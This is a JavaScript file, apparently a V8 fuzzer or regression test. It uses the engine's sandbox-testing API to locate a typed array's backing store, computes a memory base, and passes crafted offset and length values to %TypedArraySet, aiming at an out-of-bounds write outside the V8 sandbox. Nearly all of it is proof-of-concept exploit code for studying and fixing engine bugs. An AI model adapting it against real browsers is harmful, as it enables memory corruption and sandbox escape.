try {
    const kHeapObjectTag = 1;
    const v4 = Sandbox?.MemoryView;
    let v7;
    try { v7 = new v4(0, 4294967296); } catch (e) {}
    let v8;
    try { v8 = new DataView(v7); } catch (e) {}
    let memory = v8;
    function getPtr(a11) {
        let v12;
        try { v12 = Sandbox.getAddressOf(a11); } catch (e) {}
        return v12 + kHeapObjectTag;
    }
    function getField(a15, a16) {
        const v18 = (a15 + a16) - kHeapObjectTag;
        let v20;
        try { v20 = memory.getUint32(v18, true); } catch (e) {}
        return v20;
    }
    function setField(a22, a23, a24) {
        const v26 = (a22 + a23) - kHeapObjectTag;
        try { memory.setUint32(v26, a24, true); } catch (e) {}
    }
    let v31;
    try { v31 = new Uint16Array(16); } catch (e) {}
    let ta1 = v31;
    let v35;
    try { v35 = new Uint32Array(16); } catch (e) {}
    let ta2 = v35;
    const v37 = ta1?.buffer;
    let v38;
    try { v38 = getPtr(v37); } catch (e) {}
    let buf = v38;
    let v41;
    try { v41 = getField(buf, 36); } catch (e) {}
    let v43;
    try { v43 = BigInt(v41); } catch (e) {}
    const v45 = v43 >> 24n;
    let v47;
    try { v47 = getField(buf, 40); } catch (e) {}
    let v48;
    try { v48 = BigInt(v47); } catch (e) {}
    let membase = v45 | (v48 << 8n);
    const v53 = Sandbox?.base;
    let v54;
    try { v54 = BigInt(v53); } catch (e) {}
    membase += v54;
    let v57;
    try { v57 = BigInt("0x414141414000"); } catch (e) {}
    let offset = ((v57 - membase) / 2n) + (1n << 63n);
    let length = (1n << 64n) - offset;
    let v72;
    try { v72 = Number(length); } catch (e) {}
    let v73;
    try { v73 = Number(offset); } catch (e) {}
    const v74 = %TypedArraySet(ta1, ta2, v72, v73);
} catch(e75) {
}
